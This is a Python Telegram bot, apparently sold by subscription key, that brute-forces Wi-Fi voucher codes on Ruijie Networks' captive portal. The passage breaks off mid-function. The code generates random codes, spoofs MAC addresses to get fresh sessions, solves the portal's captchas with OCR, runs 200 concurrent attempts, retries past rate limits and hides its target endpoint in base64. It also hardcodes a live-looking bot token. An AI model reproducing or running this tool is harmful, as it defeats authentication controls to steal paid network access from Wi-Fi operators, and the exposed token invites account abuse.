import telebot
import asyncio
import aiohttp
import json
import base64
import random
import re
import os
import string
import time
import uuid
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
from urllib.parse import urlparse, parse_qs

# ==========================================
# REPLIT DATABASE CONNECTION
# ==========================================
try:
    from replit import db
    USE_REPLIT_DB = True
    print("[INFO] Replit Database စနစ်ကို အသုံးပြုနေပါပြီ။")
except ImportError:
    USE_REPLIT_DB = False
    print("[WARNING] Replit Database မတွေ့ပါ။ Local JSON စနစ်သို့ လွှဲပြောင်းပါမည်။")

# ==========================================
# CONFIGURATION (from bot1.py)
# ==========================================
BOT_TOKEN = '8840775162:AAEUUQPTfNEtyAbpYtD2gpdgnsw64k2XmuY'
ADMIN_ID = '8387808287'

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

# Memory States
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}
session = None
_connector = None
CONCURRENCY = 200
_voucher_sem = None
_start_time = time.monotonic()

# ==========================================
# REPLIT STORAGE UTILITIES (from bot1.py)
# ==========================================
def get_storage_data(key, default_value):
    if USE_REPLIT_DB:
        if key in db:
            try:
                return json.loads(db[key]) if isinstance(db[key], str) else db[key]
            except:
                return db[key]
        return default_value
    else:
        if os.path.exists(key + ".json"):
            try:
                with open(key + ".json", 'r', encoding='utf-8') as f:
                    return json.load(f)
            except:
                pass
        return default_value

def save_storage_data(key, data):
    if USE_REPLIT_DB:
        db[key] = data
        return True
    else:
        try:
            with open(key + ".json", 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, ensure_ascii=False)
            return True
        except Exception as e:
            print(f"Local Storage Write Error: {e}")
            return False

# ==========================================
# KEY EXPIRATION CHECK (from bot1.py)
# ==========================================
def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, str):
            try:
                expiration_time = json.loads(expiration_time)
            except:
                pass
        if "unlimited" in str(expiration_time) or "9999-12-31" in str(expiration_time):
            return True
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            plan = expiration_time.get("plan")
            if expiry == "9999-12-31T23:59:59Z" or plan == "unlimited":
                return True
            return datetime.now(timezone.utc) < datetime.fromisoformat(expiry.replace("Z", "+00:00"))
        return False
    except Exception as e:
        print(f"Key check error: {e}")
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {"30m": timedelta(minutes=30), "1h": timedelta(hours=1), "1d": timedelta(days=1), "7d": timedelta(days=7), "1m": timedelta(days=30), "1y": timedelta(days=365)}
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat() if plan in plans else None

# ==========================================
# KEEP ALIVE WEB SERVER
# ==========================================
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7 on Replit!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port}")

# ==========================================
# TELEGRAM BOT COMMAND HANDLERS
# ==========================================
@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /key ဖြင့်စတင်ပါ။")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    global approve
    key = str(message.chat.id)
    auth_list = get_storage_data("auth_list", {})
    if key in auth_list:
        valid = check_key_expiration(auth_list[key])
        if valid:
            approve[message.chat.id] = True
            user_data[message.chat.id] = {}
            await bot.reply_to(message, "✅ Key မှန်ကန်ပါသည်။ /input ဖြင့် Session URL ထည့်ပါ။")
        else:
            approve[message.chat.id] = False
            await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
    else:
        await bot.reply_to(message, "⚠️ သင်၏ key ကို registered မလုပ်ရသေးပါ။")

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    auth_list = get_storage_data("auth_list", {})
    if not auth_list:
        await bot.reply_to(message, "Registered key မရှိသေးပါ။")
        return
    lines = []
    for uid, data in auth_list.items():
        if isinstance(data, dict):
            expires = data.get("expires_at", "unknown")
            plan = data.get("plan", "unknown")
            if expires == "9999-12-31T23:59:59Z":
                expires_str = "Unlimited"
            else:
                try:
                    exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                    now = datetime.now(timezone.utc)
                    if exp_dt < now:
                        expires_str = "Expired"
                    else:
                        diff = exp_dt - now
                        expires_str = f"{diff.days}d {diff.seconds//3600}h left"
                except:
                    expires_str = expires
        else:
            plan = "old"
            expires_str = str(data)
        lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
    text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
    await bot.reply_to(message, text[:4096])

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "Usage:\n/genkey 1h 123456789")
        return
    plan = args[1]
    user_id = args[2]
    expiry = generate_expiry(plan)
    if not expiry:
        await bot.reply_to(message, "Plans: 30m, 1h, 1d, 7d, 1m, 1y, unlimited")
        return
    auth_list = get_storage_data("auth_list", {})
    auth_list[user_id] = {"expires_at": expiry, "plan": plan}
    save_storage_data("auth_list", auth_list)
    await bot.reply_to(message, f"🔑 Key Generated\n\nUSER ID : {user_id}\nPLAN : {plan}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n/delkey 123456789")
        return
    user_id = args[1]
    auth_list = get_storage_data("auth_list", {})
    if user_id not in auth_list:
        await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
        return
    del auth_list[user_id]
    save_storage_data("auth_list", auth_list)
    approve.pop(int(user_id), None)
    user_data.pop(int(user_id), None)
    await bot.reply_to(message, f"🗑️ Key Deleted\n\nUSER ID : {user_id}")

@bot.message_handler(commands=['result'])
async def handle_result(message):
    auth_list = get_storage_data("auth_list", {})
    if str(message.chat.id) in auth_list:
        results = get_storage_data("result_data", {})
        chat_id_str = str(message.chat.id)
        if chat_id_str in results and results[chat_id_str]:
            lines = []
            for item in results[chat_id_str]:
                if isinstance(item, dict):
                    lines.append(
                        f"🎫 **Code:** `{item.get('code')}`\n"
                        f"⏱️ **မိသည့်အချိန်:** {item.get('found_at')}\n"
                        f"🌐 **Router:** {item.get('router')}"
                    )
                else:
                    lines.append(f"🎫 **Code:** `{item}` (ဒေတာဟောင်း)")
            codes_text = "\n\n-------------------\n\n".join(lines)
            await bot.reply_to(message, f"✅ **အောင်မြင်ထားသော Voucher များ:**\n\n{codes_text}", parse_mode="Markdown")
        else:
            await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသော code မရှိသေးပါ။")
    else:
        await bot.reply_to(message, "သင်၏ key ကို registered မပြုလုပ်ရသေးပါ။")

@bot.message_handler(commands=['status'])
async def handle_status_check(message):
    chat_id = message.chat.id
    auth_list = get_storage_data("auth_list", {})
    total_keys = len(auth_list)
    current_task = scan_tasks.get(chat_id)
    uptime_seconds = int(time.monotonic() - _start_time)
    uptime_str = str(timedelta(seconds=uptime_seconds))
    found_count = len(success_texts.get(chat_id, []))
    
    if current_task and not current_task.get("stop"):
        status_text = (
            "⚙️ **BOT SYSTEM STATUS (SCANNING)**\n"
            "-----------------------------------\n"
            "📊 **Status:** 🔍 Running (Scanning...)\n"
            f"🆔 **Scan ID:** `{current_task.get('scan_id')[:8]}...`\n"
            f"✅ **Found so far:** {found_count} codes\n"
            f"🔁 **Retries:** {retry_counts.get(chat_id, 0)}\n"
            "-----------------------------------\n"
            f"👥 **Total Registered Keys:** {total_keys}\n"
            f"⏱️ **Bot Uptime:** {uptime_str}\n"
            "-----------------------------------\n"
            "💡 Scan ကို ရပ်တန့်လိုပါက /stop ကို နှိပ်ပါ။"
        )
    else:
        status_text = (
            "⚙️ **BOT SYSTEM STATUS (IDLE)**\n"
            "-----------------------------------\n"
            "📊 **Status:** 💤 Idle (မလှုပ်ရှားပါ)\n"
            f"👥 **Total Registered Keys:** {total_keys}\n"
            f"⏱️ **Bot Uptime:** {uptime_str}\n"
            "-----------------------------------\n"
            "💡 Scan စတင်ရန် /input ဖြင့် URL အရင်ထည့်ပြီး /scan ဖတ်နိုင်ပါသည်ဗျာ။"
        )
    await bot.reply_to(message, status_text, parse_mode="Markdown")

# ==========================================
# CHECK SESSION URL (from botsell.py with headers)
# ==========================================
async def check_session_url(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers, timeout=10) as response:
            print(f"[check_session_url] final URL: {response.url}")
            if "sessionId" in str(response.url):
                return True
            return False
    except Exception as e:
        print(f"[check_session_url] error: {e}")
        return False

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n\n/input your_session_url")
        return
    url = args[1]
    if message.chat.id in user_data:
        await bot.reply_to(message, "🔄 Session URL အားစစ်ဆေးနေပါသည်။")
        if await check_session_url(session_url=url):
            user_data[message.chat.id]['session_url'] = url
            await bot.reply_to(message, "📥 Session URL အားသိမ်းဆည်းပြီးပါပြီ။ /scan 6, 7, 8, all, ascii-lower စသည်ဖြင့်မိမိအသုံးပြုလိုတာကိုရွေးပြီး စတင်ပါ။")
        else:
            await bot.reply_to(message, "❌ Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['scan'])
async def handle_scan(message):
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n/scan 6\n/scan 7\n/scan 8\n/scan all\n/scan ascii-lower")
        return
    mode = args[1]
    scan_id = str(uuid.uuid4())
    scan_tasks[chat_id] = {"scan_id": scan_id, "stop": False}
    progress_msg = await bot.send_message(chat_id, "🔍 Scanning စတင်နေပါသည်။")
    asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message, progress_msg))

@bot.message_handler(commands=['stop'])
async def handle_stop(message):
    chat_id = message.chat.id
    if chat_id in scan_tasks:
        scan_tasks[chat_id]['stop'] = True
        await bot.reply_to(message, "🛑 Scanning ကိုရပ်တန့်လိုက်ပါပြီ။")
    else:
        await bot.reply_to(message, "လက်ရှိတွင် မည်သည့် scan မျှမရှိပါ။")

# ==========================================
# BRUTEFORCE ENGINE (from botsell.py)
# ==========================================
def digit_generator(length):
    return ''.join(random.choices(string.digits, k=length))

def ascii_generator(length):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def all_generator(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def iter_codes(mode):
    if mode == "6":
        while True:
            yield digit_generator(6)
    if mode == "7":
        while True:
            yield digit_generator(7)
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

BATCH_SIZE = 2000

def format_progress(checked, total=None, speed=0, found=0, retries=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (
            f"🔍Scanning Codes...\n\n"
            f"📦Checked : {checked:,}/{total:,}\n"
            f"📊Progress : {percent:.2f}%\n"
            f"⚡Speed : {speed_str}\n"
            f"✅Found : {found}\n"
            f"🔁Retry : {retries}\n"
            f"[{bar}]"
        )
    return (
        f"🔍Scanning Codes...\n\n"
        f"📦Checked : {checked:,}\n"
        f"⚡Speed : {speed_str}\n"
        f"✅Found : {found}\n"
        f"🔁Retry : {retries}\n"
        f"📊Status : running\n"
    )

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            if time.monotonic() - last_key_check >= 600:
                auth_list = get_storage_data("auth_list", {})
                if (
                    str(chat_id) not in auth_list
                    or not check_key_expiration(auth_list[str(chat_id)])
                ):
                    approve[chat_id] = False
                    await bot.send_message(
                        chat_id,
                        "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။"
                    )
                    scan_tasks.pop(chat_id, None)
                    success_messages.pop(chat_id, None)
                    success_texts.pop(chat_id, None)
                    return
                last_key_check = time.monotonic()

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(
                        session_url, code, chat_id, scan_id, message=message
                    )

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            checked += len(batch)

            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            found = len(success_texts.get(chat_id, []))
            retries = retry_counts.get(chat_id, 0)
            text = format_progress(checked, total, speed, found, retries)
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=text
                )
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except Exception as err:
                    print(f"Progress Message Error: {err}")

        if progress_msg:
            final_found = len(success_texts.get(chat_id, []))
            final_retries = retry_counts.get(chat_id, 0)
            finish_text = (
                "🔍Scanning Completed\n\n"
                f"📦Checked : {checked:,}\n"
                f"✅Found : {final_found}\n"
                f"🔁Retry : {final_retries}\n"
                "📊Progress : 100%\n"
                "[████████████████████]"
            )
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=finish_text
                )
            except:
                try:
                    await bot.send_message(chat_id, finish_text)
                except Exception as err:
                    print(f"Progress Finish Message Error: {err}")
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)

# ==========================================
# SESSION & MAC (from botsell.py)
# ==========================================
def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True, timeout=10) as req:
            response_url = str(req.url)
            match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response_url)
            if match:
                return match.group(1)
            else:
                return previous_session_id
    except Exception as e:
        print(f"[get_session_id] error: {e}")
        return previous_session_id

# ==========================================
# CODE EXPIRES DATE (from botsell.py)
# ==========================================
def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    hours = int(total_minutes) // 60
    minutes = int(total_minutes) % 60
    if hours > 0 and minutes > 0:
        return f"{hours}h {minutes}m"
    elif hours > 0:
        return f"{hours}h"
    else:
        return f"{minutes}m"

async def Code_Expires_Date(session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={session_id}&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=15)) as fresh_session:
            async with fresh_session.get(
                f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}',
                headers=headers
            ) as req:
                respond = await req.json()
                profile_name = respond.get('result', {}).get('profileName', 'Unknown')
                totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
                return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
    except Exception as e:
        print(f"[Code_Expires_Date] error: {e}")
        return "📋 Plan: Unknown | ⏳ Time: Unknown"

# ==========================================
# PERFORM CHECK (from botsell.py)
# ==========================================
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    for _attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:

            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                return

            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except Exception as e:
                    print(f"[perform_check] captcha error: {e}")
            if not auth_code:
                return

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": (
                    f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
                    f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
                ),
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    resp_json = json.loads(response)
                    print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
            except Exception as e:
                print(f"[perform_check] error: {e}")
                return

        if response and 'request limited' in response:
            print(f"[perform_check] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
        code_line = "\n\n".join(success_texts[chat_id])
        await SUCCESS_CODE.put({
            "chat_id": chat_id,
            "code": code,
            "expire_info": expire_date
        })
        if message:
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(
                        chat_id=message.chat.id,
                        text=f"Success Codes:\n\n{code_line}"
                    )
                    success_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=success_messages[chat_id],
                            text=f"Success Codes:\n\n{code_line}"
                        )
                    except Exception as e:
                        try:
                            sent = await bot.send_message(
                                chat_id=message.chat.id,
                                text=f"Success Codes:\n\n{code_line}"
                            )
                            success_messages[chat_id] = sent.message_id
                        except Exception as err:
                            print(f"Success Fallback Error: {err}")
            except Exception as e:
                print(f"Success Message Error: {e}")
    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        limited_texts[chat_id].append(f"⚠️ {code}\n   {expire_date}")
        limited_line = "\n\n".join(limited_texts[chat_id])
        if message:
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(
                        chat_id=message.chat.id,
                        text=f"Limited Codes:\n\n{limited_line}"
                    )
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=limited_messages[chat_id],
                            text=f"Limited Codes:\n\n{limited_line}"
                        )
                    except Exception as e:
                        try:
                            sent = await bot.send_message(
                                chat_id=message.chat.id,
                                text=f"Limited Codes:\n\n{limited_line}"
                            )
                            success_messages[chat_id] = sent.message_id
                        except Exception as err:
                            print(f"Limited Fallback Error: {err}")
            except Exception as e:
                print(f"Limited Message Error: {e}")

# ==========================================
# CAPTCHA PROCESSING (from botsell.py)
# ==========================================
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
        if data.get("success") == True:
            return session_id
        else:
            return None

# ==========================================
# REPLIT PERSISTENT STORAGE SCHEDULER
# ==========================================
async def replit_storage_scheduler():
    print("Replit Database Storage Scheduler active.")
    while True:
        try:
            data = await SUCCESS_CODE.get()
            chat_id_str = str(data['chat_id'])
            code = data['code']
            expire_info = data.get('expire_info', '')
            
            results = get_storage_data("result_data", {})
            if chat_id_str not in results: results[chat_id_str] = []
            
            # Check if code already exists (simple string or dict)
            exists = False
